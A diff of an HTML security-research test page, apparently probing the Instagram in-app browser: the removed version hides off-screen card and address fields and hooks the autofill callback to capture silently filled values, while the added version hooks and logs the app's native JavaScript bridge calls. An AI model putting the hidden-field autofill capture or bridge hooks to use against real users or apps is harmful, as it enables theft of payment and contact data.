@@ -3,84 +3,69 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Checkout</title>
+<title>bridge call logger</title>
 <style>
  body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:14px;line-height:1.45;color:#111}
- h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
- input{width:100%;padding:11px;font-size:16px;border:1px solid #ccc;border-radius:8px;margin:5px 0}
+ h1{font-size:16px}p{font-size:12px;color:#666}
  pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:8px;padding:10px;font-size:11px;white-space:pre-wrap;word-break:break-all}
- .warn{color:#b23;font-size:11px}
  button{font-size:14px;padding:10px;width:100%;border:1px solid #dcdce2;border-radius:9px;background:#fff;margin:6px 0}
- .hidden{position:absolute;left:-9999px;top:-9999px;opacity:0}
+ .warn{color:#b23;font-size:11px}
+ .big{height:160vh;background:linear-gradient(#fff,#eee)}
 </style>
 </head>
 <body>
-<h1>Benign IAB payment/contact autofill test</h1>
-<p style="font-size:12px;color:#666">Authorized research. Use your OWN Instagram test account with
-FAKE saved payment/contact data (test card <b>4111 1111 1111 1111</b>, name <b>AUTOFILL PWN TEST</b>,
-fake address). This page hooks the autofill callback and reads what gets filled into ITS OWN fields —
-proving capability with benign markers, NOT real data. Open inside the Instagram in-app browser.</p>
+<h1>Meta IAB — bridge call logger (benign, observe only)</h1>
+<p>Hooks <code>__call_iabjs_unified_bridge</code> + the native-&gt;page callbacks and LOGS every call
+Instagram's own injected scripts make — revealing the REAL method names &amp; payload shapes. It does
+NOT initiate any native call itself. Interact (scroll/tap) to make IG use its bridge.</p>
 
-<h2>payment form (tap a field; accept IG autofill if offered)</h2>
-<form onsubmit="return false" autocomplete="on">
- <input id="ccname" name="ccname" autocomplete="cc-name" placeholder="name on card">
- <input id="ccnum"  name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="card number">
- <input id="ccexp"  name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
- <input id="cccsc"  name="cvc" autocomplete="cc-csc" inputmode="numeric" placeholder="CVC">
-</form>
-
-<h2>contact form</h2>
-<form onsubmit="return false" autocomplete="on">
- <input id="name" name="name" autocomplete="name" placeholder="full name">
- <input id="tel"  name="tel" autocomplete="tel" inputmode="tel" placeholder="phone">
- <input id="addr" name="street-address" autocomplete="street-address" placeholder="address">
-</form>
-
-<!-- hidden mirror fields to test silent / all-frames distribution -->
-<div class="hidden" aria-hidden="true">
- <input id="hccnum" name="cardnumber" autocomplete="cc-number">
- <input id="hcccsc" name="cvc" autocomplete="cc-csc">
- <input id="haddr"  name="street-address" autocomplete="street-address">
-</div>
-
-<button onclick="readNow()">read all field values now</button>
-<h2>log (hooked _AutofillCallbackHandler payloads)</h2><pre id="log"></pre>
-<p class="warn">Own test account + FAKE data only. Prove capability (read the fake card), never real data.</p>
+<pre id="log"></pre>
+<button onclick="interact()">simulate interaction (scroll/focus/resize)</button>
+<p>scroll this long area to trigger IG bridge usage:</p>
+<div class="big"></div>
+<p class="warn">Observe-only. We do NOT call unknown handlers; we only log what IG already calls.</p>
 
 <script>
 function g(id){return document.getElementById(id);}
 var L=g('log'); function log(m){ L.textContent += m + '\n'; }
-function safe(x){ try{return JSON.stringify(x).slice(0,800);}catch(e){try{return String(x).slice(0,400);}catch(_){return '(unser)';}} }
 
 log('origin='+location.origin+' IG='+/Instagram/i.test(navigator.userAgent));
 
-// Hook the native->page autofill callback to capture payment/contact payloads (r = values).
-function hookCb(){
+// 1) hook the unified bridge dispatcher — captures method + nonce + payload of every call
+try{
+  if(typeof window.__call_iabjs_unified_bridge==='function'){
+    var orig = window.__call_iabjs_unified_bridge;
+    window.__call_iabjs_unified_bridge = function(method, nonce, payload){
+      try{ log('BRIDGE CALL  method='+method+'  nonce='+nonce+'  payload='+safe(payload)); }catch(e){ log('log err '+e); }
+      try{ return orig.apply(this, arguments); }catch(e){ log('orig err '+e); }
+    };
+    log('hooked __call_iabjs_unified_bridge');
+  } else log('__call_iabjs_unified_bridge not a function');
+}catch(e){ log('hook1 err '+e); }
+
+// 2) hook native->page callbacks
+['_AutofillCallbackHandler','_pcmBridgeCallbackHandler'].forEach(function(name){
   try{
-    if(typeof window._AutofillCallbackHandler==='function' && !window.__hooked){
-      var orig=window._AutofillCallbackHandler;
-      window._AutofillCallbackHandler=function(e,n,r,a){
-        try{ log('>>> AutofillCallback action='+a+'  r='+safe(r)); }catch(_){}
-        try{ return orig.apply(this,arguments); }catch(err){ log('orig err '+err); }
-      };
-      window.__hooked=true; log('hooked _AutofillCallbackHandler');
+    if(typeof window[name]==='function'){
+      var o=window[name];
+      window[name]=function(){ try{ log('CALLBACK '+name+' <= '+safe([].slice.call(arguments))); }catch(e){} try{return o.apply(this,arguments);}catch(e){ log(name+' orig err '+e); } };
+      log('hooked '+name);
     }
-  }catch(e){ log('hook err '+e); }
-}
-hookCb();
-// autofill callback may (re)load after form detection — re-hook periodically
-var hk=setInterval(hookCb, 500); setTimeout(function(){clearInterval(hk);}, 15000);
+  }catch(e){ log('hook '+name+' err '+e); }
+});
 
-// watch hidden mirrors for silent fill
-['hccnum','hcccsc','haddr'].forEach(function(id){ g(id).addEventListener('input', function(){ log('HIDDEN '+id+' filled = '+g(id).value); }); });
+// 3) try to observe messageHandlers access via a Proxy (if the engine allows reassigning)
+try{
+  if(window.webkit && window.webkit.messageHandlers){
+    var realMH = window.webkit.messageHandlers;
+    var prox = new Proxy(realMH, { get:function(t,p){ try{ if(typeof p==='string') log('messageHandlers.get -> "'+p+'"'); }catch(e){} return t[p]; } });
+    try{ Object.defineProperty(window.webkit, 'messageHandlers', { get:function(){ return prox; }, configurable:true }); log('proxied messageHandlers (will log name lookups)'); }
+    catch(e){ log('cannot redefine messageHandlers: '+e); }
+  }
+}catch(e){ log('proxy err '+e); }
 
-function readNow(){
-  log('--- read ---');
-  ['ccname','ccnum','ccexp','cccsc','name','tel','addr','hccnum','hcccsc','haddr'].forEach(function(id){
-    var v=g(id).value; if(v) log(id+' = '+v);
-  });
-  log('(any HIDDEN field with a value you never typed = silent autofill exfil)');
-}
+function safe(x){ try{ return JSON.stringify(x).slice(0,500);}catch(e){ try{return String(x).slice(0,300);}catch(_){return '(unser)';} } }
+function interact(){ try{ window.scrollTo(0,300); window.dispatchEvent(new Event('resize')); document.body.click(); log('dispatched scroll/resize/click'); }catch(e){ log('interact err '+e); } }
 </script>
 </body>
 </html>
